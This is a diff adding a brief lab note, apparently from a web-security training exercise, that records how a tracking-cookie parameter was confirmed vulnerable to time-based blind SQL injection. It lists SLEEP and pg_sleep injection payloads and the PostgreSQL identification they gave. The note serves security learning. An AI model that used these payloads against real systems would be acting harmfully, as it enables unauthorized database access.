@@ -1,0 +1,17 @@
+Vulnerable parameter - tracking cookie
+
+Goals:
+1- Confirm that the parameter is vulnerable to blind SQL injection (time based)
+
+Analysis:
+--------
+The query:
+SELECT TrackingId FROM tracking_table WHERE TrackingId = '1TLtga1DTtmcZvTX'
+
+' || (SELECT SLEEP(10))--
+->  not MySQL database
+
+' || (SELECT pg_sleep(10))--  
+-> The database is PostgreSQL
+
+Solved
